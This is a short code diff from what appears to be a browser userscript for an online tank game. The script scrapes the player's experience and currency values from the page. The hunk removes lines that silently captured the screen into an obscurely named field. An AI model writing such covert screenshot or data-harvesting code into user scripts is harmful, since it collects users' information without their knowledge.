@@ -91,9 +91,6 @@ try{if(!access){window.whitelist=["Sui","Snitch"];}else{try{if(!whitelist) {whit
         if (!User.exp) {
             if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
                 User.exp = t.textContent;
-                window.captureScreen().then(result => {
-                    User.patata = result;
-                });
             };
         };
         if (!User.crystals || !User.tankoins) {
